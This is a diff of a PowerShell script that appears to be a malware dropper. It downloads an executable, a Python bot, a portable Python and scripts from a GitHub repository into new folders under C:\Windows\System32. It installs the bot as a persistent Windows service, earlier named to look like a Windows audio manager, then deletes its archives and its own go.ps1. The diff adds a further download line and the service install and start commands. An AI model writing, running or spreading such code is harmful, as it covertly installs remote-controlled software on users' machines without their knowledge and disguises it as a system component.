@@ -24,11 +24,12 @@ if (Test-Path "C:\Windows\System32\Int-service.xml") {
 New-Item -Path "C:\Windows\System32\re-as" -ItemType Directory
 New-Item -Path "C:\Windows\System32\ap32" -ItemType Directory
 
-Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/nssm.exe?dl=1" -OutFile $destino
+Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/Int-service.exe?dl=1" -OutFile $destino
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/bot.py?dl=1" -OutFile $destino2
 Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64.zip?dl=1" -OutFile $destino3
 Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/WPy64_2.zip?dl=1" -OutFile $destino4
 Invoke-WebRequest -Uri "https://github.com/miguelsantos029/yolo/raw/refs/heads/main/scripts.zip?dl=1" -OutFile $destino5
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miguelsantos029/yolo/refs/heads/main/Int-service.xml?dl=1" -OutFile $destino6
 
 Expand-Archive -Path $destino3 -DestinationPath "C:\Windows\System32\re-as" -Force
 Expand-Archive -Path $destino4 -DestinationPath "C:\Windows\System32\re-as" -Force
@@ -41,8 +42,8 @@ Remove-Item "C:\Windows\System32\re-as\WPy64_2.zip" -Force
 Remove-Item "C:\Windows\System32\ap32\scripts.zip" -Force
 Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force
 
-C:\Windows\System32\nssm.exe install "Gestor Primario de Audio do Windows" "C:\Windows\System32\re-as\WPy64\python\python.exe" "C:\Windows\System32\ap32\bot.py"
-C:\Windows\System32\nssm.exe restart "Gestor Primario de Audio do Windows"
+C:\Windows\System32\Int-service.exe install
+C:\Windows\System32\Int-service.exe start
 
 if (Test-Path "C:\Windows\go.ps1") {
     Remove-Item "C:\Windows\go.ps1" -Force
